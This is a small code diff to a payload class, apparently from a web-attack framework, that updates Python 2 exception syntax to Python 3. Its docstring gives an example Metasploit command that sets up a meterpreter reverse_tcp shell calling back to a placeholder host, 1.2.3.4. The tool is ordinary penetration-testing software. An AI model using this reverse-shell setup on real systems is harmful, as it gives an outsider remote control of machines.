@@ -18,10 +18,11 @@ class metasploit(Payload):
     A complete example looks like this:
         linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E
     """
+
     def api_execute(self, msf_args):
         try:
             vd = get_virtual_daemon(self.shell.execute)
-        except BaseFrameworkException, w3:
+        except BaseFrameworkException as w3:
             return 'Error, %s' % w3
         else:
             vd.run(msf_args)
